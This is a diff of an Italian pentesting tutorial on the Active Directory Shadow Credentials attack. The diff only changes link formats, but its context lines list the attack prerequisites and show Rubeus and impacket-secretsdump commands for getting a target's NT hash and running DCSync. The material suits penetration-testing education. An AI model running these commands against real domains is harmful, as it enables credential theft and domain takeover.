@@ -50,11 +50,11 @@ Prima di partire, verifica questi tre punti — se manca anche uno, l'attacco no
 
 | Requisito                                           | Come verificarlo                                                                                                                                                          |
 | --------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Write access su `msDS-KeyCredentialLink` del target | [BloodHound](https://hackita.it/articoli/bloodhound/) → edge `AddKeyCredentialLink`, ma anche `GenericAll`/`GenericWrite`/`WriteProperty` sul target abilitano la tecnica |
+| Write access su `msDS-KeyCredentialLink` del target | [BloodHound](/articoli/bloodhound/) → edge `AddKeyCredentialLink`, ma anche `GenericAll`/`GenericWrite`/`WriteProperty` sul target abilitano la tecnica |
 | DC Windows Server 2016+ con PKINIT                  | `certipy find` o verifica versione OS del DC                                                                                                                              |
 | Domain Functional Level 2016+                       | `netdom query fsmo` o LDAP query su `msDS-Behavior-Version`                                                                                                               |
 
-Se PKINIT non è disponibile la tecnica non funziona: valuta [RBCD](https://hackita.it/articoli/semachineaccountquota/) come alternativa.
+Se PKINIT non è disponibile la tecnica non funziona: valuta [RBCD](/articoli/semachineaccountquota/) come alternativa.
 
 ## Quando Shadow Credentials NON Funziona
 
@@ -156,7 +156,7 @@ Rubeus.exe asktgt /user:targetUser /certificate:targetUser.pfx /password:Passw0r
 L'NT hash ottenuto è quello reale del target. Da qui:
 
 * **Pass-the-Hash** verso qualsiasi servizio del dominio con quell'account
-* Se il target era il computer account di un DC (`DC01$`) → [DCSync](https://hackita.it/articoli/dcsync/) diretto:
+* Se il target era il computer account di un DC (`DC01$`) → [DCSync](/articoli/dcsync/) diretto:
 
 ```bash
 impacket-secretsdump -hashes :<NT_HASH> corp.local/'DC01$'@<DC_IP>
